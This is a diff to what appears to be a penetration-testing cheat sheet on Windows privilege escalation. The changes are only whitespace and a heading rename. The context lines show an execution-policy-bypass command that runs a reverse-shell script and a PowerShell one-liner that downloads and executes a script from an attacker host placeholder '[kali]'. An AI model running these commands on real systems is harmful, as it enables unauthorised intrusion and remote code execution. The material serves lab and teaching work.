@@ -79,6 +79,7 @@ Powershell
 ```
 # Exec local PS script
 cmd> powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"
+
 # Exec remote PS script
 PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
 ```
@@ -87,6 +88,7 @@ Powershell locations on 64bit Windows
 ```
 # 32bit powershell
 c:\windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+
 # 64bit powershell
 c:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
 C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe
@@ -109,7 +111,7 @@ Ensure architecture of your PS shell = architecture of PS payload.
 
 ## OS Vulnerabilities
 
-Windows Privesc Checker
+Windows Exploit Suggester
 ```
 $ python3 windows_exploit_suggester.py --update
 $ python3 windows_exploit_suggester.py --database 2021-10-27-mssb.xls --systeminfo systeminfo.out
